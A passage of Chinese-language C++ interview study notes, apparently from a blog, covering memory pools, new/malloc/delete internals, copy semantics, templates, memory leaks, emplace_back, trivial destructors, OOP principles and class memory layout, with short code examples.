class="headerlink" title="57、什么是内存池，如何实现"></a>57、什么是内存池，如何实现</h4><p><a href="https://www.bilibili.com/video/BV1Kb411B7N8?p=25">https://www.bilibili.com/video/BV1Kb411B7N8?p=25</a> c内存管理：P23-26</p><p><a href="https://www.bilibili.com/video/BV1db411q7B8?p=12">https://www.bilibili.com/video/BV1db411q7B8?p=12</a> cSTL P11</p><p>内存池（Memory Pool） 是一种<strong>内存分配</strong>方式。通常我们习惯直接使用new、malloc 等申请内存，这样做的缺点在于：由于所申请内存块的大小不定，当频繁使用时会造成大量的内存碎片并进而降低性能。内存池则是在真正使用内存之前，先申请分配一定数量的、大小相等(一般情况下)的内存块留作备用。当有新的内存需求时，就从内存池中分出一部分内存块， 若内存块不够再继续申请新的内存。这样做的一个显著优点是尽量避免了内存碎片，使得内存分配效率得到提升。</p><p>这里简单描述一下《STL源码剖析》中的内存池实现机制：</p><p>allocate包装malloc,deallocate包装free</p><p>一般是一次20*2个的申请，先用一半，留着一半，为什么也没个说法，侯捷在STL那边书里说好像是c委员会成员认为20是个比较好的数字，既不大也不小</p><ol><li>首先客户端会调用malloc()配置一定数量的区块（固定大小的内存块，通常为8的倍数），假设40个32bytes的区块，其中20个区块（一半）给程序实际使用，1个区块交出，另外19个处于维护状态。剩余20个（一半）留给内存池，此时一共有（20*32byte）</li><li>客户端之后有有内存需求，想申请（20*64bytes）的空间，这时内存池只有（20<em>32bytes），就先将（10\</em>64bytes)个区块返回，1个区块交出，另外9个处于维护状态，此时内存池空空如也</li><li>接下来如果客户端还有内存需求，就必须再调用malloc()配置空间，此时新申请的区块数量会增加一个随着配置次数越来越大的附加量，同样一半提供程序使用，另一半留给内存池。申请内存的时候用永远是先看内存池有无剩余，有的话就用上，然后挂在0-15号某一条链表上，要不然就重新申请。</li><li>如果整个堆的空间都不够了，就会在原先已经分配区块中寻找能满足当前需求的区块数量，能满足就返回，不能满足就向客户端报bad_alloc异常</li></ol><blockquote><p>《STL源码解析》侯捷 P68</p></blockquote><p>allocator就是用来分配内存的，最重要的两个函数是allocate和deallocate，就是用来申请内存和回收内存的，外部（一般指容器）调用的时候只需要知道这些就够了。内部实现，目前的所有编译器都是直接调用的::operator new()和::operator delete()，说白了就是和直接使用new运算符的效果是一样的，所以老师说它们都没做任何特殊处理。 </p><p>最开始GC2.9之前：</p><p>new和 operator new 的区别：new 是个运算符，编辑器会调用 operator new(0)</p><p>operator new()里面有调用malloc的操作，那同样的 operator delete()里面有调用的free的操作</p><p>GC2.9的alloc的一个比较好的分配器的实现规则</p><p>维护一条0-15号的一共16条链表，其中0表示8 bytes ，1表示 16 bytes,2表示 24bytes。。。。而15 表示 16* 8 = 128bytes，如果在申请时并不是8的倍数，那就找刚好能满足内存大小的那个位置。比如想申请 12，那就是找16了，想申请 20 ，那就找 24 了</p><p>但是现在GC4.9及其之后 也还有，变成_pool_alloc这个名字了，不再是默认的了，你需要自己去指定它可以自己指定，比如说vector\<string,__gnu_cxx::pool_alloc<string>&gt; vec;这样来使用它，现在用的又回到以前那种对malloc和free的包装形式了</p><h4 id="58、从汇编层去解释一下引用"><a href="#58、从汇编层去解释一下引用" class="headerlink" title="58、从汇编层去解释一下引用"></a>58、从汇编层去解释一下引用</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token number">9</span><span class="token operator">:</span>      <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token number">00401048</span>  mov     dword ptr <span class="token punctuation">[</span>ebp<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token number">10</span><span class="token operator">:</span>     <span class="token keyword">int</span> <span class="token operator">&amp;</span>b <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token number">0040104F</span>   lea     eax<span class="token punctuation">,</span><span class="token punctuation">[</span>ebp<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token number">00401052</span>  mov     dword ptr <span class="token punctuation">[</span>ebp<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>eax</code></pre><p>x的地址为ebp-4，b的地址为ebp-8，因为栈内的变量内存是从高往低进行分配的，所以b的地址比x的低。</p><p>lea eax,[ebp-4] 这条语句将x的地址ebp-4放入eax寄存器</p><p>mov dword ptr [ebp-8],eax 这条语句将eax的值放入b的地址</p><p>ebp-8中上面两条汇编的作用即：将x的地址存入变量b中，这不和将某个变量的地址存入指针变量是一样的吗？所以从汇编层次来看，的确引用是通过指针来实现的。</p><h4 id="59、深拷贝与浅拷贝是怎么回事？"><a href="#59、深拷贝与浅拷贝是怎么回事？" class="headerlink" title="59、深拷贝与浅拷贝是怎么回事？"></a>59、深拷贝与浅拷贝是怎么回事？</h4><p>1)  浅复制 ：只是拷贝了基本类型的数据，而引用类型数据，复制后也是会发生引用，我们把这种拷贝叫做“（浅复制）浅拷贝”，换句话说，浅复制仅仅是指向被复制的内存地址，如果原地址中对象被改变了，那么浅复制出来的对象也会相应改变。</p><p>深复制 ：在计算机中开辟了一块新的内存地址用于存放复制的对象。</p><p>​    </p><p>2)  在某些状况下，类内成员变量需要动态开辟堆内存，如果实行位拷贝，也就是把对象里的值完全复制给另一个对象，如A=B。这时，如果B中有一个成员变量指针已经申请了内存，那A中的那个成员变量也指向同一块内存。这就出现了问题：当B把内存释放了（如：析构），这时A内的指针就是野指针了，出现运行错误。</p><h4 id="60、c模板是什么，你知道底层怎么实现的？"><a href="#60、c模板是什么，你知道底层怎么实现的？" class="headerlink" title="60、c模板是什么，你知道底层怎么实现的？"></a>60、c模板是什么，你知道底层怎么实现的？</h4><p>1)  编译器并不是把函数模板处理成能够处理任意类的函数；编译器从函数模板通过具体类型产生不同的函数；编译器会对函数模板进行两次编译：在声明的地方对模板代码本身进行编译，在调用的地方对参数替换后的代码进行编译。</p><p>2)  这是因为函数模板要被实例化后才能成为真正的函数，在使用函数模板的源文件中包含函数模板的头文件，如果该头文件中只有声明，没有定义，那编译器无法实例化该模板，最终导致链接错误。</p><h4 id="61、new和malloc的区别？"><a href="#61、new和malloc的区别？" class="headerlink" title="61、new和malloc的区别？"></a>61、new和malloc的区别？</h4><p>1、 new/delete是c关键字，需要编译器支持。malloc/free是库函数，需要头文件支持；</p><p>2、 使用new操作符申请内存分配时无须指定内存块的大小，编译器会根据类型信息自行计算。而malloc则需要显式地指出所需内存的尺寸。</p><p>3、 new操作符内存分配成功时，返回的是对象类型的指针，类型严格与对象匹配，无须进行类型转换，故new是符合类型安全性的操作符。而malloc内存分配成功则是返回void <em> ，需要通过强制类型转换将void</em>指针转换成我们需要的类型。</p><p>4、 new内存分配失败时，会抛出bac_alloc异常。malloc分配内存失败时返回NULL。</p><p>5、 new会先调用operator new函数，申请足够的内存（通常底层使用malloc实现）。然后调用类型的构造函数，初始化成员变量，最后返回自定义类型指针。delete先调用析构函数，然后调用operator delete函数释放内存（通常底层使用free实现）。malloc/free是库函数，只能动态的申请和释放内存，无法强制要求其做自定义类型对象构造和析构工作。</p><h4 id="62、delete-p、delete-p、allocator都有什么作用？"><a href="#62、delete-p、delete-p、allocator都有什么作用？" class="headerlink" title="62、delete p、delete [] p、allocator都有什么作用？"></a>62、delete p、delete [] p、allocator都有什么作用？</h4><p>1、 动态数组管理new一个数组时，[]中必须是一个整数，但是不一定是常量整数，普通数组必须是一个常量整数；</p><p>2、 new动态数组返回的并不是数组类型，而是一个元素类型的指针；</p><p>3、 delete[]时，数组中的元素按逆序的顺序进行销毁；</p><p>4、 new在内存分配上面有一些局限性，new的机制是将内存分配和对象构造组合在一起，同样的，delete也是将对象析构和内存释放组合在一起的。allocator将这两部分分开进行，allocator申请一部分内存，不进行初始化对象，只有当需要的时候才进行初始化操作。</p><h4 id="63、new和delete的实现原理，-delete是如何知道释放内存的大小的额？"><a href="#63、new和delete的实现原理，-delete是如何知道释放内存的大小的额？" class="headerlink" title="63、new和delete的实现原理， delete是如何知道释放内存的大小的额？"></a>63、new和delete的实现原理， delete是如何知道释放内存的大小的额？</h4><p>1、 new简单类型直接调用operator new分配内存；</p><p>而对于复杂结构，先调用operator new分配内存，然后在分配的内存上调用构造函数；</p><p>对于简单类型，new[]计算好大小后调用operator new；</p><p>对于复杂数据结构，new[]先调用operator new[]分配内存，然后在p的前四个字节写入数组大小n，然后调用n次构造函数，针对复杂类型，new[]会额外存储数组大小；</p><p>①   new表达式调用一个名为operator new(operator new[])函数，分配一块足够大的、原始的、未命名的内存空间；</p><p>②   编译器运行相应的构造函数以构造这些对象，并为其传入初始值；</p><p>③   对象被分配了空间并构造完成，返回一个指向该对象的指针。</p><p>2、 delete简单数据类型默认只是调用free函数；复杂数据类型先调用析构函数再调用operator delete；针对简单类型，delete和delete[]等同。假设指针p指向new[]分配的内存。因为要4字节存储数组大小，实际分配的内存地址为[p-4]，系统记录的也是这个地址。delete[]实际释放的就是p-4指向的内存。而delete会直接释放p指向的内存，这个内存根本没有被系统记录，所以会崩溃。</p><p>3、 需要在 new [] 一个对象数组时，需要保存数组的维度，c 的做法是在分配数组空间时多分配了 4 个字节的大小，专门保存数组的大小，在 delete [] 时就可以取出这个保存的数，就知道了需要调用析构函数多少次了。</p><h4 id="64、malloc申请的存储空间能用delete释放吗"><a href="#64、malloc申请的存储空间能用delete释放吗" class="headerlink" title="64、malloc申请的存储空间能用delete释放吗"></a>64、malloc申请的存储空间能用delete释放吗</h4><p>不能，malloc /free主要为了兼容C，new和delete 完全可以取代malloc /free的。</p><p>malloc /free的操作对象都是必须明确大小的，而且不能用在动态类上。</p><p>new 和delete会自动进行类型检查和大小，malloc/free不能执行<a href="https://www.baidu.com/s?wd=构造函数&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao">构造函数</a>与析构函数，所以动态对象它是不行的。</p><p>当然从理论上说使用malloc申请的内存是可以通过delete释放的。不过一般不这样写的。而且也不能保证每个c的运行时都能正常。</p><h4 id="65、malloc与free的实现原理？"><a href="#65、malloc与free的实现原理？" class="headerlink" title="65、malloc与free的实现原理？"></a>65、malloc与free的实现原理？</h4><p>1、 在标准C库中，提供了malloc/free函数分配释放内存，这两个函数底层是由brk、mmap、，munmap这些系统调用实现的;</p><p>2、 brk是将数据段(.data)的最高地址指针_edata往高地址推,mmap是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存。这两种方式分配的都是虚拟内存，没有分配物理内存。在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系；</p><p>3、 malloc小于128k的内存，使用brk分配内存，将_edata往高地址推；malloc大于128k的内存，使用mmap分配内存，在堆和栈之间找一块空闲内存分配；brk分配的内存需要等到高地址内存释放以后才能释放，而mmap分配的内存可以单独释放。当最高地址空间的空闲内存超过128K（可由M_TRIM_THRESHOLD选项调节）时，执行内存紧缩操作（trim）。在上一个步骤free的时候，发现最高地址空闲内存超过128K，于是内存紧缩。</p><p>4、 malloc是从堆里面申请内存，也就是说函数返回的指针是指向堆里面的一块内存。操作系统中有一个记录空闲内存地址的链表。当操作系统收到程序的申请时，就会遍历该链表，然后就寻找第一个空间大于所申请空间的堆结点，然后就将该结点从空闲结点链表中删除，并将该结点的空间分配给程序。</p><h4 id="66、malloc、realloc、calloc的区别"><a href="#66、malloc、realloc、calloc的区别" class="headerlink" title="66、malloc、realloc、calloc的区别"></a>66、malloc、realloc、calloc的区别</h4><p>1)   malloc函数</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>申请<span class="token number">20</span>个<span class="token keyword">int</span>类型的空间；</code></pre><p>2)   calloc函数</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">calloc</span><span class="token punctuation">(</span>size_t n<span class="token punctuation">,</span>size_t size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>省去了人为空间计算；malloc申请的空间的值是随机初始化的，calloc申请的空间的值是初始化为0的；</p><p>3)   realloc函数</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> size_t new_size<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>给动态分配的空间分配额外的空间，用于扩充容量。</p><h4 id="67、类成员初始化方式？构造函数的执行顺序-？为什么用成员初始化列表会快一些？"><a href="#67、类成员初始化方式？构造函数的执行顺序-？为什么用成员初始化列表会快一些？" class="headerlink" title="67、类成员初始化方式？构造函数的执行顺序 ？为什么用成员初始化列表会快一些？"></a>67、类成员初始化方式？构造函数的执行顺序 ？为什么用成员初始化列表会快一些？</h4><p>1)  赋值初始化，通过在函数体内进行赋值初始化；列表初始化，在冒号后使用初始化列表进行初始化。</p><p>这两种方式的主要区别在于：</p><p>对于在函数体中初始化,是在所有的数据成员被分配内存空间后才进行的。</p><p>列表初始化是给数据成员分配内存空间时就进行初始化,就是说分配一个数据成员只要冒号后有此数据成员的赋值表达式(此表达式必须是括号赋值表达式),那么分配了内存空间后在进入函数体之前给数据成员赋值，就是说初始化这个数据成员此时函数体还未执行。 </p><p>2)  一个派生类构造函数的执行顺序如下：</p><p>①   虚拟基类的构造函数（多个虚拟基类则按照继承的顺序执行构造函数）。</p><p>②   基类的构造函数（多个普通基类也按照继承的顺序执行构造函数）。</p><p>③   类类型的成员对象的构造函数（按照初始化顺序）</p><p>④   派生类自己的构造函数。</p><p>3)  方法一是在构造函数当中做赋值的操作，而方法二是做纯粹的初始化操作。我们都知道，c的赋值操作是会产生临时对象的。临时对象的出现会降低程序的效率。</p><h4 id="68、成员列表初始化？"><a href="#68、成员列表初始化？" class="headerlink" title="68、成员列表初始化？"></a>68、成员列表初始化？</h4><p>1)  必须使用成员初始化的四种情况</p><p>①    当初始化一个引用成员时；</p><p>②    当初始化一个常量成员时；</p><p>③    当调用一个基类的构造函数，而它拥有一组参数时；</p><p>④    当调用一个成员类的构造函数，而它拥有一组参数时；</p><p>2)  成员初始化列表做了什么</p><p>①    编译器会一一操作初始化列表，以适当的顺序在构造函数之内安插初始化操作，并且在任何显示用户代码之前；</p><p>②    list中的项目顺序是由类中的成员声明顺序决定的，不是由初始化列表的顺序决定的；</p><h4 id="69、什么是内存泄露，如何检测与避免"><a href="#69、什么是内存泄露，如何检测与避免" class="headerlink" title="69、什么是内存泄露，如何检测与避免"></a>69、什么是内存泄露，如何检测与避免</h4><p><strong>内存泄露</strong></p><p>一般我们常说的内存泄漏是指<strong>堆内存的泄漏</strong>。堆内存是指程序从堆中分配的，大小任意的(内存块的大小可以在程序运行期决定)内存块，使用完后必须显式释放的内存。应用程序般使用malloc,、realloc、 new等函数从堆中分配到块内存，使用完后，程序必须负责相应的调用free或delete释放该内存块，否则，这块内存就不能被再次使用，我们就说这块内存泄漏了</p><p><strong>避免内存泄露的几种方式</strong></p><ul><li>计数法：使用new或者malloc时，让该数+1，delete或free时，该数-1，程序执行完打印这个计数，如果不为0则表示存在内存泄露</li><li>一定要将基类的析构函数声明为<strong>虚函数</strong></li><li>对象数组的释放一定要用<strong>delete []</strong></li><li>有new就有delete，有malloc就有free，保证它们一定成对出现</li></ul><p><strong>检测工具</strong></p><ul><li>Linux下可以使用<strong>Valgrind工具</strong></li><li>Windows下可以使用<strong>CRT库</strong></li></ul><h4 id="70、对象复用的了解，零拷贝的了解"><a href="#70、对象复用的了解，零拷贝的了解" class="headerlink" title="70、对象复用的了解，零拷贝的了解"></a>70、对象复用的了解，零拷贝的了解</h4><p><strong>对象复用</strong></p><p>对象复用其本质是一种设计模式：Flyweight享元模式。</p><p>通过将对象存储到“对象池”中实现对象的重复利用，这样可以避免多次创建重复对象的开销，节约系统资源。</p><p><strong>零拷贝</strong></p><p>零拷贝就是一种避免 CPU 将数据从一块存储拷贝到另外一块存储的技术。</p><p>零拷贝技术可以减少数据拷贝和共享总线操作的次数。</p><p>在c中，vector的一个成员函数<strong>emplace_back()</strong>很好地体现了零拷贝技术，它跟push_back()函数一样可以将一个元素插入容器尾部，区别在于：<strong>使用push_back()函数需要调用拷贝构造函数和转移构造函数，而使用emplace_back()插入的元素原地构造，不需要触发拷贝构造和转移构造</strong>，效率更高。举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>    string name<span class="token punctuation">;</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token comment">//初始构造函数</span>    <span class="token function">Person</span><span class="token punctuation">(</span>string p_name<span class="token punctuation">,</span> <span class="token keyword">int</span> p_age<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">name</span><span class="token punctuation">(</span>std<span class="token operator">::</span><span class="token function">move</span><span class="token punctuation">(</span>p_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">age</span><span class="token punctuation">(</span>p_age<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>         cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I have been constructed"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">//拷贝构造函数</span>     <span class="token function">Person</span><span class="token punctuation">(</span><span class="token keyword">const</span> Person<span class="token operator">&amp;</span> other<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">name</span><span class="token punctuation">(</span>std<span class="token operator">::</span><span class="token function">move</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">age</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>age<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>         cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I have been copy constructed"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">//转移构造函数</span>     <span class="token function">Person</span><span class="token punctuation">(</span>Person<span class="token operator">&amp;&amp;</span> other<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token function">name</span><span class="token punctuation">(</span>std<span class="token operator">::</span><span class="token function">move</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">age</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>age<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>         cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I have been moved"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vector<span class="token operator">&lt;</span>Person<span class="token operator">></span> e<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"emplace_back:"</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    e<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token string">"Jane"</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//不用构造类对象</span>    vector<span class="token operator">&lt;</span>Person<span class="token operator">></span> p<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"push_back:"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    p<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token function">Person</span><span class="token punctuation">(</span><span class="token string">"Mike"</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出结果：</span><span class="token comment">//emplace_back:</span><span class="token comment">//I have been constructed</span><span class="token comment">//push_back:</span><span class="token comment">//I have been constructed</span><span class="token comment">//I am being moved.</span></code></pre><h4 id="71、解释一下什么是trivial-destructor"><a href="#71、解释一下什么是trivial-destructor" class="headerlink" title="71、解释一下什么是trivial destructor"></a>71、解释一下什么是trivial destructor</h4><p>“trivial destructor”一般是指用户没有自定义析构函数，而由系统生成的，这种析构函数在《STL源码解析》中成为“无关痛痒”的析构函数。</p><p>反之，用户自定义了析构函数，则称之为“non-trivial destructor”，这种析构函数<strong>如果申请了新的空间一定要显式的释放，否则会造成内存泄露</strong></p><p>对于trivial destructor，如果每次都进行调用，显然对效率是一种伤害，如何进行判断呢？《STL源码解析》中给出的说明是：</p><blockquote><p>首先利用value<em>type()获取所指对象的型别，再利用__type_traits<T>判断该型别的析构函数是否trivial，若是(\</em>_true<em>type)，则什么也不做，若为(\</em>_false_type)，则去调用destory()函数</p></blockquote><p>也就是说，在实际的应用当中，STL库提供了相关的判断方法<strong>__type_traits</strong>，感兴趣的读者可以自行查阅使用方式。除了trivial destructor，还有trivial construct、trivial copy construct等，如果能够对是否trivial进行区分，可以采用内存处理函数memcpy()、malloc()等更加高效的完成相关操作，提升效率。</p><blockquote><p>《c中的 trivial destructor》：<a href="https://blog.csdn.net/wudishine/article/details/12307611">https://blog.csdn.net/wudishine/article/details/12307611</a></p></blockquote><h4 id="72、介绍面向对象的三大特性，并且举例说明"><a href="#72、介绍面向对象的三大特性，并且举例说明" class="headerlink" title="72、介绍面向对象的三大特性，并且举例说明"></a>72、介绍面向对象的三大特性，并且举例说明</h4><p>三大特性：继承、封装和多态</p><p><strong>（1）继承</strong></p><p><strong>让某种类型对象获得另一个类型对象的属性和方法。</strong></p><p>它可以使用现有类的所有功能，并在无需重新编写原来的类的情况下对这些功能进行扩展</p><p>常见的继承有三种方式：</p><ol><li>实现继承：指使用基类的属性和方法而无需额外编码的能力</li><li>接口继承：指仅使用属性和方法的名称、但是子类必须提供实现的能力</li><li>可视继承：指子窗体（类）使用基窗体（类）的外观和实现代码的能力（c里好像不怎么用）</li></ol><p>例如，将人定义为一个抽象类，拥有姓名、性别、年龄等公共属性，吃饭、睡觉、走路等公共方法，在定义一个具体的人时，就可以继承这个抽象类，既保留了公共属性和方法，也可以在此基础上扩展跳舞、唱歌等特有方法</p><p><strong>（2）封装</strong></p><p>数据和代码捆绑在一起，避免外界干扰和不确定性访问。</p><p>封装，也就是<strong>把客观事物封装成抽象的类</strong>，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的进行信息隐藏，例如：将公共的数据或方法使用public修饰，而不希望被访问的数据或方法采用private修饰。</p><p><strong>（3）多态</strong>  </p><p>同一事物表现出不同事物的能力，即向不同对象发送同一消息，不同的对象在接收时会产生不同的行为<strong>（重载实现编译时多态，虚函数实现运行时多态）</strong>。</p><p>多态性是允许你将父对象设置成为和一个或更多的他的子对象相等的技术，赋值之后，父对象就可以根据当前赋值给它的子对象的特性以不同的方式运作。<strong>简单一句话：允许将子类类型的指针赋值给父类类型的指针</strong></p><p>实现多态有二种方式：覆盖（override），重载（overload）。覆盖：是指子类重新定义父类的虚函数的做法。重载：是指允许存在多个同名函数，而这些函数的参数表不同（或许参数个数不同，或许参数类型不同，或许两者都不同）。例如：基类是一个抽象对象——人，那教师、运动员也是人，而使用这个抽象对象既可以表示教师、也可以表示运动员。</p><blockquote><p>《c封装继承多态总结》：<a href="https://blog.csdn.net/IOT_SHUN/article/details/79674293">https://blog.csdn.net/IOT_SHUN/article/details/79674293</a></p></blockquote><h4 id="73、c中类的数据成员和成员函数内存分布情况"><a href="#73、c中类的数据成员和成员函数内存分布情况" class="headerlink" title="73、c中类的数据成员和成员函数内存分布情况"></a>73、c中类的数据成员和成员函数内存分布情况</h4><p>c类是由结构体发展得来的，所以他们的成员变量（C语言的结构体只有成员变量）的内存分配机制是一样的。下面我们以类来说明问题，如果类的问题通了，结构体也也就没问题啦。 类分为成员变量和成员函数，我们先来讨论成员变量。 </p><p>一个类对象的地址就是类所包含的这一片内存空间的首地址，这个首地址也就对应具体某一个成员变量的地址。（在定义类对象的同时这些成员变量也就被定义了），举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class Person<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>    <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        this<span class="token operator">-></span>age <span class="token operator">=</span> <span class="token number">23</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">printAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> this<span class="token operator">-></span>age <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token operator">~</span><span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>public<span class="token operator">:</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Person p<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"对象地址："</span><span class="token operator">&lt;&lt;</span> <span class="token operator">&amp;</span>p <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"age地址："</span><span class="token operator">&lt;&lt;</span> <span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>age<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"对象大小："</span><span class="token operator">&lt;&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"age大小："</span><span class="token operator">&lt;&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>age<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//输出结果</span><span class="token comment">//对象地址：0x7fffec0f15a8</span><span class="token comment">//age地址：0x7fffec0f15a8</span><span class="token comment">//对象大小：4</span><span class="token comment">//age大小：4</span></code></pre><p>从代码运行结果来看，对象的大小和对象中数据成员的大小是一致的，也就是说，成员函数不占用对象的内存。这是因为所有的函数都是存放在代码区的，不管是全局函数，还是成员函数。要是成员函数占用类的对象空间，那么将是多么可怕的事情：定义一次类对象就有成员函数占用一段空间。 我们再来补充一下静态成员函数的存放问题：<strong>静态成员函数与一般成员函数的唯一区别就是没有this指针</strong>，因此不能访问非静态数据成员，就像我前面提到的，<strong>所有函数都存放在代码区，静态函数也不例外。所有有人一看到 static 这个单词就主观的认为是存放在全局数据区，那是不对的。</strong></p><blockquote><p>《c类对象成员变量和函数内存分配的问题》：<a href="https://blog.csdn.net/z2664836046/article/details/78967313">https://blog.csdn.net/z2664836046/article/details/78967313</a></p></blockquote><h4 id="74、成员初始化列表的概念，为什么用它会快一些？"><a href="#74、成员初始化列表的概念，为什么用它会快一些？" class="headerlink" title="74、成员初始化列表的概念，为什么用它会快一些？"></a>74、成员初始化列表的概念，为什么用它会快一些？</h4><p><strong>成员初始化列表的概念</strong></p><p>在类的构造函数中，不在函数体内对成员变量赋值，而是在构造函数的花括号前面使用冒号和初始化列表赋值</p><p><strong>效率</strong></p><p>用初始化列表会快一些的原因是，对于类型，它少了一次调用构造函数的过程，而在函数体中赋值则会多一次调用。而对于内置数据类型则没有差别。举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace 